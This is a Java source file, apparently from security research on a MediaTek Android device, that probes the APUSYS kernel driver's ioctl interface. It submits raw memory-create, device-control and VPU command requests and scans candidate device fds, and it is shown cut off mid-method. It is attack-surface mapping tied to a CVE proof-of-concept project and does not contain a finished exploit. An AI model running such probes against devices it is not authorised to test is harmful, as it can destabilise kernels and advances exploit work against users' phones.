/**
 * APUSYS ioctl reachability probe.
 *
 * Build this class together with DrmTrigger.java so it can reuse the pure-Java
 * syscall helper from the system_app dalvikvm context:
 *   javac -source 8 -target 8 -cp $ANDROID_JAR -d /tmp/apusys-build \
 *     07-cve-2023-32836-display-overflow/poc/DrmTrigger.java \
 *     13-apusys-ioctl-surface/poc/ApusysIoctlProbe.java
 */
public final class ApusysIoctlProbe {
    private static final String APUSYS_DEV = "/dev/apusys";

    private static final long APUSYS_CMD_HANDSHAKE   = 0xC0284100L;
    private static final long APUSYS_CMD_MEM_FREE_02 = 0xC0384102L;
    private static final long APUSYS_CMD_MEM_CREATE2 = 0xC0384103L;
    private static final long APUSYS_CMD_MEM_CREATE3 = 0xC038410FL;
    private static final long APUSYS_CMD_MEM_FREE_10 = 0xC0384110L;
    private static final long APUSYS_CMD_RUN_SYNC    = 0x40184106L;
    private static final long APUSYS_CMD_RUN_ASYNC   = 0xC0184107L;
    private static final long APUSYS_CMD_DEV_CTRL    = 0x400C4109L;
    private static final long APUSYS_CMD_UCMD        = 0x4014410EL;
    private static final long APUSYS_CMD_DISABLED_0C = 0x4038410CL;
    private static final long APUSYS_CMD_DISABLED_0D = 0x4038410DL;
    private static final long APUSYS_CMD_UNKNOWN     = 0x41414141L;

    private static final long DRM_IOCTL_PRIME_HANDLE_TO_FD = 0xC00C642DL;
    private static final long ION_IOC_ALLOC          = 0xC0204900L;
    private static final long ION_IOC_FREE           = 0xC0044901L;
    private static final long ION_IOC_SHARE          = 0xC0084904L;

    private static final int OFF_HANDSHAKE = 0x100;
    private static final int OFF_RUN_CMD   = 0x140;
    private static final int OFF_UCMD      = 0x180;
    private static final int OFF_MEM_A     = 0x1c0;
    private static final int OFF_MEM_B     = 0x220;
    private static final int OFF_DEV_CTRL  = 0x280;
    private static final int OFF_DRM_CREATE  = 0x300;
    private static final int OFF_DRM_PRIME   = 0x340;
    private static final int OFF_DRM_DESTROY = 0x360;
    private static final int OFF_MEM_DMABUF  = 0x380;
    private static final int OFF_ION_ALLOC   = 0x400;
    private static final int OFF_ION_SHARE   = 0x440;
    private static final int OFF_ION_FREE    = 0x460;

    private static final int RUN_CMD_PAYLOAD_ZERO = 0;
    private static final int RUN_CMD_PAYLOAD_INVALID_SC = 1;
    private static final int RUN_CMD_PAYLOAD_VPU_GUARD = 2;
    private static final int RUN_CMD_PAYLOAD_VPU_EXEC = 3;
    private static final int RUN_CMD_PAYLOAD_VPU_IOVA = 4;

    private static final int XRP_SETTINGS_OFF = 0x000;
    private static final int XRP_SETTINGS_LEN = 0x100;
    private static final int XRP_CODE_OFF = 0x100;
    private static final int XRP_CODE_SIZE_ZERO = 0x00;
    private static final int XRP_CODE_OP_SIZE = 0x1c8;
    private static final int XRP_OPCODE_NONE = 0;
    private static final int XRP_OPCODE_GET_ALGO_INFO = 10001;
    private static final int XRP_OPCODE_LOCAL_MEM_INFO = 10002;
    private static final int XRP_OPCODE_XTENSA_ANN_VERSION = 10003;
    private static final int XRP_OPCODE_GET_DETAILED_OP_INFO = 10004;
    private static final int XRP_OUTPUT_OFF = 0x200;
    private static final int XRP_NZ_OUTPUT_OFF = 0x300;
    private static final int XRP_OUTPUT_SIZE = 0x80;
    private static final int XRP_DATA_DESC_OFF = 0x300;
    private static final int XRP_NZ_DATA_DESC_OFF = 0x400;
    private static final int XRP_DATA_DESC_SIZE = 0x0c;
    private static final int XRP_DATA_PAYLOAD_OFF = 0x400;
    private static final int XRP_NZ_DATA_PAYLOAD_OFF = 0x500;
    private static final int XRP_DATA_PAYLOAD_SIZE = 0x80;
    private static final int XRP_PLANE_PAYLOAD_OFF = 0x600;
    private static final int XRP_NZ_PLANE_PAYLOAD_OFF = 0x700;
    private static final int XRP_PLANE_PAYLOAD_SIZE = 0x80;
    private static final byte[] XRP_CMD_MAGIC = new byte[] {
        (byte) 0xde, 0x63, (byte) 0xdb, (byte) 0xbe,
        0x4a, (byte) 0x99, 0x48, (byte) 0x89,
        (byte) 0x90, (byte) 0x83, (byte) 0xf0, 0x7b,
        (byte) 0xf8, 0x61, 0x09, 0x7a
    };

    private static final XrpOpSpec XRP_OP_NONE = new XrpOpSpec(
        "zero_code", "none", XRP_OPCODE_NONE, 0, 0, new int[0]);
    private static final XrpOpSpec XRP_OP_ANN_VERSION = new XrpOpSpec(
        "ann_version", "XTENSA_ANN_VERSION",
        XRP_OPCODE_XTENSA_ANN_VERSION, 0, 1, new int[] { 0 });
    private static final XrpOpSpec[] XRP_OP_MATRIX = new XrpOpSpec[] {
        new XrpOpSpec("get_algo_info_out0", "GET_ALGO_INFO",
            XRP_OPCODE_GET_ALGO_INFO, 0, 1, new int[] { 0 }),
        new XrpOpSpec("local_mem_info_out0", "LOCAL_MEM_INFO",
            XRP_OPCODE_LOCAL_MEM_INFO, 0, 1, new int[] { 0 }),
        new XrpOpSpec("ann_version_out0", "XTENSA_ANN_VERSION",
            XRP_OPCODE_XTENSA_ANN_VERSION, 0, 1, new int[] { 0 }),
        new XrpOpSpec("detailed_op_info_out0", "GET_DETAILED_OP_INFO",
            XRP_OPCODE_GET_DETAILED_OP_INFO, 0, 1, new int[] { 0 }),
        new XrpOpSpec("ann_version_no_output", "XTENSA_ANN_VERSION",
            XRP_OPCODE_XTENSA_ANN_VERSION, 0, 0, new int[0]),
        new XrpOpSpec("ann_version_out1", "XTENSA_ANN_VERSION",
            XRP_OPCODE_XTENSA_ANN_VERSION, 0, 1, new int[] { 1 })
    };

    private static final class XrpOpSpec {
        final String label;
        final String name;
        final int opcode;
        final int inputCount;
        final int outputCount;
        final int[] operandIds;

        XrpOpSpec(String label, String name, int opcode, int inputCount,
                  int outputCount, int[] operandIds) {
            if (operandIds.length != inputCount + outputCount) {
                throw new IllegalArgumentException("operand count mismatch");
            }
            this.label = label;
            this.name = name;
            this.opcode = opcode;
            this.inputCount = inputCount;
            this.outputCount = outputCount;
            this.operandIds = operandIds;
        }

        boolean hasCode() {
            return opcode != XRP_OPCODE_NONE;
        }
    }

    private ApusysIoctlProbe() {
    }

    public static void main(String[] args) throws Exception {
        boolean query = false;
        boolean memNegative = false;
        boolean devCtrl = false;
        boolean memDmabuf = false;
        boolean memIon = false;
        boolean fdScan = false;
        boolean ucmdNegative = false;
        boolean hardwareBuffer = false;
        boolean ucmdHardwareBuffer = false;
        boolean runCmdHardwareBuffer = false;
        boolean runCmdInvalidSc = false;
        boolean runCmdVpuGuard = false;
        boolean runCmdVpuExec = false;
        boolean runCmdVpuIova = false;
        boolean runCmdVpuIovaControl = false;
        boolean runCmdVpuXrpIova = false;
        boolean runCmdVpuXrpIovaControl = false;
        boolean runCmdVpuXrpSplitIova = false;
        boolean runCmdVpuXrpSplitIovaControl = false;
        boolean runCmdVpuXrpAnnVersionIova = false;
        boolean runCmdVpuXrpAnnVersionIovaControl = false;
        boolean runCmdVpuXrpInternalAnnVersionIova = false;
        boolean runCmdVpuXrpInternalAnnVersionIovaControl = false;
        boolean runCmdVpuXrpOpMatrixIova = false;
        boolean runCmdVpuXrpOpMatrixIovaControl = false;
        XrpOpSpec runCmdVpuXrpOpCaseIova = null;
        XrpOpSpec runCmdVpuXrpOpCaseIovaControl = null;
        String ucmdKey = null;
        String ucmdKeyDump = null;
        for (String arg : args) {
            if ("--query".equals(arg)) {
                query = true;
            } else if ("--mem-negative".equals(arg)) {
                memNegative = true;
            } else if ("--dev-ctrl".equals(arg)) {
                devCtrl = true;
            } else if ("--mem-dmabuf".equals(arg)) {
                memDmabuf = true;
            } else if ("--mem-ion".equals(arg)) {
                memIon = true;
            } else if ("--fd-scan".equals(arg)) {
                fdScan = true;
            } else if ("--ucmd-negative".equals(arg)) {
                ucmdNegative = true;
            } else if ("--hardwarebuffer".equals(arg)) {
                hardwareBuffer = true;
            } else if ("--ucmd-hardwarebuffer".equals(arg)) {
                ucmdHardwareBuffer = true;
            } else if ("--run-cmd-hardwarebuffer".equals(arg)) {
                runCmdHardwareBuffer = true;
            } else if ("--run-cmd-invalid-sc".equals(arg)) {
                runCmdInvalidSc = true;
            } else if ("--run-cmd-vpu-guard".equals(arg)) {
                runCmdVpuGuard = true;
            } else if ("--run-cmd-vpu-exec".equals(arg)) {
                runCmdVpuExec = true;
            } else if ("--run-cmd-vpu-iova".equals(arg)) {
                runCmdVpuIova = true;
            } else if ("--run-cmd-vpu-iova-control".equals(arg)) {
                runCmdVpuIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-iova".equals(arg)) {
                runCmdVpuXrpIova = true;
            } else if ("--run-cmd-vpu-xrp-iova-control".equals(arg)) {
                runCmdVpuXrpIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-split-iova".equals(arg)) {
                runCmdVpuXrpSplitIova = true;
            } else if ("--run-cmd-vpu-xrp-split-iova-control".equals(arg)) {
                runCmdVpuXrpSplitIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-ann-version-iova".equals(arg)) {
                runCmdVpuXrpAnnVersionIova = true;
            } else if ("--run-cmd-vpu-xrp-ann-version-iova-control".equals(arg)) {
                runCmdVpuXrpAnnVersionIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIova = true;
            } else if ("--run-cmd-vpu-xrp-internal-ann-version-iova-control".equals(arg)) {
                runCmdVpuXrpInternalAnnVersionIovaControl = true;
            } else if ("--run-cmd-vpu-xrp-op-matrix-iova".equals(arg)) {
                runCmdVpuXrpOpMatrixIova = true;
            } else if ("--run-cmd-vpu-xrp-op-matrix-iova-control".equals(arg)) {
                runCmdVpuXrpOpMatrixIovaControl = true;
            } else if (arg.startsWith("--run-cmd-vpu-xrp-op-case-iova=")) {
                String label = arg.substring(
                    "--run-cmd-vpu-xrp-op-case-iova=".length());
                runCmdVpuXrpOpCaseIova = requireXrpOpSpec(label);
            } else if (arg.startsWith("--run-cmd-vpu-xrp-op-case-iova-control=")) {
                String label = arg.substring(
                    "--run-cmd-vpu-xrp-op-case-iova-control=".length());
                runCmdVpuXrpOpCaseIovaControl = requireXrpOpSpec(label);
            } else if (arg.startsWith("--ucmd-key=")) {
                ucmdKey = arg.substring("--ucmd-key=".length());
                validateUcmdKey(ucmdKey);
            } else if (arg.startsWith("--ucmd-key-dump=")) {
                ucmdKeyDump = arg.substring("--ucmd-key-dump=".length());
                validateUcmdKey(ucmdKeyDump);
            } else {
                throw new IllegalArgumentException("unknown option: " + arg);
            }
        }

        System.out.println("[*] === APUSYS ioctl probe ===");
        if (memNegative || devCtrl || memDmabuf || memIon || fdScan
                || ucmdNegative || hardwareBuffer || ucmdHardwareBuffer
                || runCmdHardwareBuffer || runCmdInvalidSc || runCmdVpuGuard
                || runCmdVpuExec || runCmdVpuIova || runCmdVpuIovaControl
                || runCmdVpuXrpIova || runCmdVpuXrpIovaControl
                || runCmdVpuXrpSplitIova || runCmdVpuXrpSplitIovaControl
                || runCmdVpuXrpAnnVersionIova || runCmdVpuXrpAnnVersionIovaControl
                || runCmdVpuXrpInternalAnnVersionIova
                || runCmdVpuXrpInternalAnnVersionIovaControl
                || runCmdVpuXrpOpMatrixIova || runCmdVpuXrpOpMatrixIovaControl
                || runCmdVpuXrpOpCaseIova != null
                || runCmdVpuXrpOpCaseIovaControl != null
                || ucmdKey != null || ucmdKeyDump != null) {
            System.out.println("[*] Mode: optional checks enabled;"
                + " no secure alloc/free; some modes submit controlled"
                + " provider probes\n");
        } else {
            System.out.println("[*] Mode: reject/query paths only;"
                + " no memory create/free, no dev-ctrl, no valid cmdbuf\n");
        }

        DrmTrigger.initSyscall();

        int fd = -1;
        try {
            fd = DrmTrigger.openDev(APUSYS_DEV);
            System.out.println("[+] Opened " + APUSYS_DEV + " fd=" + fd);

            ioctlAndPrint(fd, "unknown", APUSYS_CMD_UNKNOWN, 0);
            ioctlAndPrint(fd, "disabled_0c", APUSYS_CMD_DISABLED_0C, 0);
            ioctlAndPrint(fd, "disabled_0d", APUSYS_CMD_DISABLED_0D, 0);

            long handshake = DrmTrigger.sScratchBuf + OFF_HANDSHAKE;
            DrmTrigger.zeroMem(handshake, 0x28);
            ioctlAndPrint(fd, "handshake_reject", APUSYS_CMD_HANDSHAKE, handshake);

            long runCmd = DrmTrigger.sScratchBuf + OFF_RUN_CMD;
            DrmTrigger.zeroMem(runCmd, 0x18);
            DrmTrigger.unsafePutInt(runCmd + 0x0c, 1);
            ioctlAndPrint(fd, "run_async_reject", APUSYS_CMD_RUN_ASYNC, runCmd);
            ioctlAndPrint(fd, "run_sync_reject", APUSYS_CMD_RUN_SYNC, runCmd);

            long ucmd = DrmTrigger.sScratchBuf + OFF_UCMD;
            DrmTrigger.zeroMem(ucmd, 0x14);
            DrmTrigger.unsafePutInt(ucmd + 0x0c, 1);
            ioctlAndPrint(fd, "ucmd_reject", APUSYS_CMD_UCMD, ucmd);

            if (query) {
                DrmTrigger.zeroMem(handshake, 0x28);
                DrmTrigger.unsafePutInt(handshake + 0x0c, 1);
                long ret = ioctlAndPrint(fd, "handshake_query", APUSYS_CMD_HANDSHAKE, handshake);
                if (ret >= 0) {
                    dumpU32Words("handshake", handshake, 0x28);
                }
            }

            if (memNegative) {
                runMemNegative(fd);
            }

            if (devCtrl) {
                runDevCtrlProbe(fd);
            }

            if (memDmabuf) {
                runMemDmabuf(fd);
            }

            if (memIon) {
                runMemIon(fd);
            }

            if (fdScan) {
                runFdScan(fd);
            }

            if (ucmdNegative) {
                runUcmdNegative(fd);
            }

            if (hardwareBuffer) {
                runHardwareBufferProbe(fd);
            }

            if (ucmdHardwareBuffer) {
                runUcmdHardwareBufferProbe(fd);
            }

            if (runCmdHardwareBuffer) {
                runRunCmdHardwareBufferProbe(fd);
            }

            if (runCmdInvalidSc) {
                runRunCmdInvalidScHardwareBufferProbe(fd);
            }

            if (runCmdVpuGuard) {
                runRunCmdVpuGuardHardwareBufferProbe(fd);
            }

            if (runCmdVpuExec) {
                runRunCmdVpuExecHardwareBufferProbe(fd);
            }

            if (runCmdVpuIova) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, true, false, false,
                    XRP_OP_NONE);
            }

            if (runCmdVpuIovaControl) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, false, false, false,
                    XRP_OP_NONE);
            }

            if (runCmdVpuXrpIova) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, true, true, false,
                    XRP_OP_NONE);
            }

            if (runCmdVpuXrpIovaControl) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, false, true, false,
                    XRP_OP_NONE);
            }

            if (runCmdVpuXrpSplitIova) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, true, true, true,
                    XRP_OP_NONE);
            }

            if (runCmdVpuXrpSplitIovaControl) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, false, true, true,
                    XRP_OP_NONE);
            }

            if (runCmdVpuXrpAnnVersionIova) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, true, true, true,
                    XRP_OP_ANN_VERSION);
            }

            if (runCmdVpuXrpAnnVersionIovaControl) {
                runRunCmdVpuIovaHardwareBufferProbe(fd, false, true, true,
                    XRP_OP_ANN_VERSION);
            }

            if (runCmdVpuXrpInternalAnnVersionIova) {
                runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(fd, true);
            }

            if (runCmdVpuXrpInternalAnnVersionIovaControl) {
                runRunCmdVpuXrpInternalAnnVersionHardwareBufferProbe(fd, false);
            }

            if (runCmdVpuXrpOpMatrixIova) {
                runRunCmdVpuXrpOpMatrixHardwareBufferProbe(fd, true);
            }

            if (runCmdVpuXrpOpMatrixIovaControl) {
                runRunCmdVpuXrpOpMatrixHardwareBufferProbe(fd, false);
            }

            if (runCmdVpuXrpOpCaseIova != null) {
                runRunCmdVpuXrpOpCaseHardwareBufferProbe(fd, true,
                    runCmdVpuXrpOpCaseIova);
            }

            if (runCmdVpuXrpOpCaseIovaControl != null) {
                runRunCmdVpuXrpOpCaseHardwareBufferProbe(fd, false,
                    runCmdVpuXrpOpCaseIovaControl);
            }

            if (ucmdKey != null) {
                runUcmdKeyHardwareBufferProbe(fd, ucmdKey);
            }

            if (ucmdKeyDump != null) {
                runUcmdKeyDumpHardwareBufferProbe(fd, ucmdKeyDump);
            }

            System.out.println("\n[+] Probe completed. Interpret results as handler reachability only.");
        } finally {
            if (fd >= 0) {
                DrmTrigger.closeFd(fd);
            }
        }
    }

    private static void runMemNegative(int fd) throws Exception {
        System.out.println("\n[*] === Optional APUSYS memory negative tests ===");
        System.out.println("[*] Mode: NULL user pointer and bad fd/zero-size only; no valid dmabuf");

        ioctlAndPrint(fd, "mem_create2_null", APUSYS_CMD_MEM_CREATE2, 0);
        ioctlAndPrint(fd, "mem_create3_null", APUSYS_CMD_MEM_CREATE3, 0);

        long memA = DrmTrigger.sScratchBuf + OFF_MEM_A;
        DrmTrigger.zeroMem(memA, 0x38);
        long ret = ioctlAndPrint(fd, "mem_create2_zero", APUSYS_CMD_MEM_CREATE2, memA);
        cleanupMemSuccess(fd, "mem_create2", APUSYS_CMD_MEM_FREE_02, memA, ret);
        DrmTrigger.zeroMem(memA, 0x38);
        DrmTrigger.unsafePutInt(memA + 0x20, -1);
        ret = ioctlAndPrint(fd, "mem_create2_badfd", APUSYS_CMD_MEM_CREATE2, memA);
        cleanupMemSuccess(fd, "mem_create2", APUSYS_CMD_MEM_FREE_02, memA, ret);

        long memB = DrmTrigger.sScratchBuf + OFF_MEM_B;
        DrmTrigger.zeroMem(memB, 0x38);
        ret = ioctlAndPrint(fd, "mem_create3_zero", APUSYS_CMD_MEM_CREATE3, memB);
        cleanupMemSuccess(fd, "mem_create3", APUSYS_CMD_MEM_FREE_10, memB, ret);
        DrmTrigger.zeroMem(memB, 0x38);
        DrmTrigger.unsafePutInt(memB + 0x20, -1);
        ret = ioctlAndPrint(fd, "mem_create3_badfd", APUSYS_CMD_MEM_CREATE3, memB);
        cleanupMemSuccess(fd, "mem_create3", APUSYS_CMD_MEM_FREE_10, memB, ret);
    }

    private static void runDevCtrlProbe(int fd) throws Exception {
        System.out.println("\n[*] === Optional APUSYS device-control tests ===");
        System.out.println("[*] Mode: ioctl 0x400c4109 with known provider ids,"
            + " core 0/1, control value 0");

        probeDevCtrl(fd, "mdla", 0x02, 0, 0);
        probeDevCtrl(fd, "mdla", 0x02, 1, 0);
        probeDevCtrl(fd, "vpu", 0x03, 0, 0);
        probeDevCtrl(fd, "vpu", 0x03, 1, 0);
        probeDevCtrl(fd, "edma", 0x04, 0, 0);
        probeDevCtrl(fd, "edma", 0x04, 1, 0);
        probeDevCtrl(fd, "mdla_rt", 0x22, 0, 0);
        probeDevCtrl(fd, "mdla_rt", 0x22, 1, 0);
        probeDevCtrl(fd, "vpu_rt", 0x23, 0, 0);
        probeDevCtrl(fd, "vpu_rt", 0x23, 1, 0);
    }

    private static long probeDevCtrl(int fd, String provider, int devId,
                                     int coreId, int control) throws Exception {
        long devCtrl = DrmTrigger.sScratchBuf + OFF_DEV_CTRL;
        DrmTrigger.zeroMem(devCtrl, 0x0c);
        DrmTrigger.unsafePutInt(devCtrl + 0x00, devId);
        DrmTrigger.unsafePutInt(devCtrl + 0x04, coreId);
        DrmTrigger.unsafePutInt(devCtrl + 0x08, control);

        String name = "devctl_" + provider + "_c" + coreId;
        return ioctlAndPrint(fd, name, APUSYS_CMD_DEV_CTRL, devCtrl);
    }

    private static void runMemDmabuf(int apusysFd) throws Exception {
        System.out.println("\n[*] === Optional APUSYS dmabuf memory-create tests ===");
        System.out.println("[*] Mode: create DRM dumb buffer, export PRIME fd,"
            + " import through APUSYS type2/type3 descriptors");

        int drmFd = -1;
        int dmaBufFd = -1;
        int handle = 0;
        try {
            drmFd = DrmTrigger.openDev("/dev/dri/card0");
            System.out.println("[+] Opened /dev/dri/card0 fd=" + drmFd);

            long create = DrmTrigger.sScratchBuf + OFF_DRM_CREATE;
            DrmTrigger.zeroMem(create, 0x20);
            DrmTrigger.unsafePutInt(create + 0x00, 64);  // height
            DrmTrigger.unsafePutInt(create + 0x04, 64);  // width
            DrmTrigger.unsafePutInt(create + 0x08, 32);  // bpp
            long ret = DrmTrigger.rawIoctl(drmFd, DrmTrigger.DRM_IOCTL_MODE_CREATE_DUMB, create);
            System.out.println("[*] drm_create_dumb   cmd=0x"
                + Long.toHexString(DrmTrigger.DRM_IOCTL_MODE_CREATE_DUMB)
                + " ret=" + retText(ret));
            if (ret < 0) {
                return;
            }

            handle = DrmTrigger.unsafeGetInt(create + 0x10);
            int pitch = DrmTrigger.unsafeGetInt(create + 0x14);
            long size = DrmTrigger.unsafeGetLong(create + 0x18);
            System.out.println("    dumb: handle=" + handle + " pitch=" + pitch
                + " size=0x" + Long.toHexString(size));

            long prime = DrmTrigger.sScratchBuf + OFF_DRM_PRIME;
            DrmTrigger.zeroMem(prime, 0x10);
            DrmTrigger.unsafePutInt(prime + 0x00, handle);
            DrmTrigger.unsafePutInt(prime + 0x04, 0);  // flags
            ret = DrmTrigger.rawIoctl(drmFd, DRM_IOCTL_PRIME_HANDLE_TO_FD, prime);
            System.out.println("[*] drm_prime_to_fd   cmd=0x"
                + Long.toHexString(DRM_IOCTL_PRIME_HANDLE_TO_FD)
                + " ret=" + retText(ret));
            if (ret < 0) {
                return;
            }

            dmaBufFd = DrmTrigger.unsafeGetInt(prime + 0x08);
            System.out.println("    dmabuf fd=" + dmaBufFd);

            runMemCreateWithFd(apusysFd, "mem_create2_dmabuf",
                APUSYS_CMD_MEM_CREATE2, APUSYS_CMD_MEM_FREE_02, dmaBufFd, size);
            runMemCreateWithFd(apusysFd, "mem_create3_dmabuf",
                APUSYS_CMD_MEM_CREATE3, APUSYS_CMD_MEM_FREE_10, dmaBufFd, size);
        } finally {
            if (dmaBufFd >= 0) {
                DrmTrigger.closeFd(dmaBufFd);
            }
            if (drmFd >= 0 && handle != 0) {
                long destroy = DrmTrigger.sScratchBuf + OFF_DRM_DESTROY;
                DrmTrigger.zeroMem(destroy, 0x08);
                DrmTrigger.unsafePutInt(destroy + 0x00, handle);
                long ret = DrmTrigger.rawIoctl(drmFd, DrmTrigger.DRM_IOCTL_MODE_DESTROY_DUMB, destroy);
                System.out.println("[*] drm_destroy_dumb cmd=0x"
                    + Long.toHexString(DrmTrigger.DRM_IOCTL_MODE_DESTROY_DUMB)
                    + " ret=" + retText(ret));
            }
            if (drmFd >= 0) {
                DrmTrigger.closeFd(drmFd);
            }
        }
    }

    private static void runMemIon(int apusysFd) throws Exception {
        System.out.println("\n[*] === Optional APUSYS ION memory-create tests ===");
        System.out.println("[*] Mode: allocate old-ION buffer, share dmabuf fd,"
            + " import through APUSYS type2/type3 descriptors");

        int ionFd = -1;
        int dmaBufFd = -1;
        int handle = 0;
        int heapMask = 0;
        int[] heapMasks = {0x4, 0x1, 0x2, 0x8, 0x10, 0x20, 0x40, 0x100};
        try {
            try {
                ionFd = DrmTrigger.openDev("/dev/ion");
            } catch (RuntimeException e) {
                System.out.println("[-] open /dev/ion failed: " + e.getMessage());
                return;
            }
            System.out.println("[+] Opened /dev/ion fd=" + ionFd);

            for (int i = 0; i < heapMasks.length; i++) {
                int candidate = heapMasks[i];
                handle = ionAlloc(ionFd, candidate, 0x4000);
                if (handle != 0) {
                    heapMask = candidate;
                    break;
                }
            }

            if (handle == 0) {
                System.out.println("[-] ION allocation failed for all tested heap masks");
                return;
            }

            dmaBufFd = ionShare(ionFd, handle);
            if (dmaBufFd < 0) {
                return;
            }

            System.out.println("    ion: heap_mask=0x" + Integer.toHexString(heapMask)
                + " handle=" + handle + " dmabuf_fd=" + dmaBufFd);
            runMemCreateWithFd(apusysFd, "mem_create2_ion",
                APUSYS_CMD_MEM_CREATE2, APUSYS_CMD_MEM_FREE_02, dmaBufFd, 0x4000);
            runMemCreateWithFd(apusysFd, "mem_create3_ion",
                APUSYS_CMD_MEM_CREATE3, APUSYS_CMD_MEM_FREE_10, dmaBufFd, 0x4000);
        } finally {
            if (dmaBufFd >= 0) {
                DrmTrigger.closeFd(dmaBufFd);
            }
            if (ionFd >= 0 && handle != 0) {
                ionFree(ionFd, handle);
            }
            if (ionFd >= 0) {
                DrmTrigger.closeFd(ionFd);
            }
        }
    }

    private static void runFdScan(int apusysFd) throws Exception {
        System.out.println("\n[*] === Optional APUSYS fd-source scan ===");
        System.out.println("[*] Mode: open candidate fds and feed memory-create only;"
            + " no ucmd execution");

        String[] candidates = {
            "/dev/dma_heap/system",
            "/dev/dma_heap/system-uncached",
            "/dev/dma_heap/mtk_mm",
            "/dev/dma_heap/mtk_mm-uncached",
            "/dev/dri/card0",
            "/dev/mali0",
            "/dev/ashmem",
            "/dev/zero",
            "/dev/null",
            "/dev/apusys",
            "/dev/ion"
        };

        for (int i = 0; i < candidates.length; i++) {
            String path = candidates[i];
            int fd = -1;
            String label = fdLabel(path);
            try {
                try {
                    fd = DrmTrigger.openDev(path);
                    System.out.println("[+] fdscan_open_" + label + " fd=" + fd);
                } catch (RuntimeException e) {
                    System.out.println("[-] fdscan_open_" + label + " failed: "
                        + e.getMessage());
                    continue;
                }

                runMemCreateWithFd(apusysFd, "fdscan2_" + label,
                    APUSYS_CMD_MEM_CREATE2, APUSYS_CMD_MEM_FREE_02, fd, 0x1000);
                runMemCreateWithFd(apusysFd, "fdscan3_" + label,
                    APUSYS_CMD_MEM_CREATE3, APUSYS_CMD_MEM_FREE_10, fd, 0x1000);
            } finally {
                if (fd >= 0) {
                    DrmTrigger.closeFd(fd);
                }
            }
        }
    }

    private static void runUcmdNegative(int apusysFd) throws Exception {
        System.out.println("\n[*] === Optional APUSYS ucmd negative tests ===");
        System.out.println("[*] Mode: normal VPU device id 3, core 0/1,"
            + " bad fd, offset 0, nonzero length");

        runUcmdWithFd(apusysFd, "ucmd_vpu_c0_badfd", 3, 0, -1, 0, 0x1000);
        runUcmdWithFd(apusysFd, "ucmd_vpu_c1_badfd", 3, 1, -1, 0, 0x1000);
    }

    private static long runUcmdWithFd(int apusysFd, String name, int devId,
                                      int coreId, int fd, int offset, int length)
            throws Exception {
        long ucmd = DrmTrigger.sScratchBuf + OFF_UCMD;
        DrmTrigger.zeroMem(ucmd, 0x14);
        DrmTrigger.unsafePutInt(ucmd + 0x00, devId);
        DrmTrigger.unsafePutInt(ucmd + 0x04, coreId);
        DrmTrigger.unsafePutInt(ucmd + 0x08, fd);
        DrmTrigger.unsafePutInt(ucmd + 0x0c, offset);
        DrmTrigger.unsafePutInt(ucmd + 0x10, length);
        return ioctlAndPrint(apusysFd, name, APUSYS_CMD_UCMD, ucmd);
    }

    private static void runHardwareBufferProbe(int apusysFd) throws Exception {
        System.out.println("\n[*] === Optional HardwareBuffer dmabuf probe ===");
        System.out.println("[*] Mode: allocate HardwareBuffer, inspect fd-bearing Parcel,"
            + " import discovered fds through APUSYS memory-create only");

        loadRuntimeLibraries();
        dumpClassShape("android.hardware.HardwareBuffer");
        dumpClassShape("android.os.HwBinder");
        dumpClassShape("android.os.HwParcel");
        dumpClassShape("android.os.NativeHandle");
        dumpClassShape("android.hardware.common.NativeHandle");
        dumpClassShape("android.hardware.graphics.common.HardwareBuffer");
        dumpClassShape("android.hardware.graphics.allocator.V4_0.IAllocator");

        android.hardware.HardwareBuffer hb = null;
        try {
            long usage = android.hardware.HardwareBuffer.USAGE_CPU_READ_OFTEN
                | android.hardware.HardwareBuffer.USAGE_CPU_WRITE_OFTEN
                | android.hardware.HardwareBuffer.USAGE_GPU_SAMPLED_IMAGE;
            hb = android.hardware.HardwareBuffer.create(
                64, 64, android.hardware.HardwareBuffer.RGBA_8888, 1, usage);
            System.out.println("[+] HardwareBuffer created:"
                + " id=" + optionalLongMethod(hb, "getId")
                + " width=" + optionalIntMethod(hb, "getWidth")
                + " height=" + optionalIntMethod(hb, "getHeight")
                + " format=" + optionalIntMethod(hb, "getFormat")
                + " layers=" + optionalIntMethod(hb, "getLayers")
                + " usage=" + optionalLongMethod(hb, "getUsage"));

            probeHardwareBufferParcel(apusysFd, hb, false, false, "hwb");
        } catch (Throwable t) {
            System.out.println("[-] HardwareBuffer probe failed: " + shortThrowable(t));
        } finally {
            if (hb != null) {
                hb.close();
            }
        }
    }

    private static void runUcmdHardwareBufferProbe(int apusysFd) throws Exception {
        System.out.println("\n[*] === Optional APUSYS ucmd HardwareBuffer gate probe ===");
        System.out.println("[*] Mode: write first u32 through ImageWriter,"
            + " import HardwareBuffer fd, then call normal VPU ucmd core 0/1");

        loadRuntimeLibraries();
        dumpClassShape("android.hardware.HardwareBuffer");
        dumpClassShape("android.media.ImageReader");
        dumpClassShape("android.media.ImageWriter");

        runOneUcmdHardwareBufferProbe(apusysFd, "zero", 0);
        runOneUcmdHardwareBufferProbe(apusysFd, "gate8001", 0x8001);
    }

    private static void runUcmdKeyHardwareBufferProbe(int apusysFd, String key)
            throws Exception {
        System.out.println("\n[*] === Optional APUSYS ucmd key lookup probe ===");
        System.out.println("[*] Mode: emulate libvpu.so getAlgo payload:"
            + " first_u32=0x8001, key at +4, then normal VPU ucmd core 0/1");

        loadRuntimeLibraries();
        dumpClassShape("android.hardware.HardwareBuffer");
        dumpClassShape("android.media.ImageReader");
        dumpClassShape("android.media.ImageWriter");

        runOneUcmdHardwareBufferProbe(apusysFd,
            "key_" + sanitizeLabel(key), 0x8001, key);
    }

    private static void runUcmdKeyDumpHardwareBufferProbe(int apusysFd, String key)
            throws Exception {
        System.out.println("\n[*] === Optional APUSYS ucmd key lookup dump probe ===");
        System.out.println("[*] Mode: same as --ucmd-key, plus Image plane"
            + " payload dump before/after each ucmd ioctl");

        loadRuntimeLibraries();
        dumpClassShape("android.hardware.HardwareBuffer");
        dumpClassShape("android.media.ImageReader");
        dumpClassShape("android.media.ImageWriter");

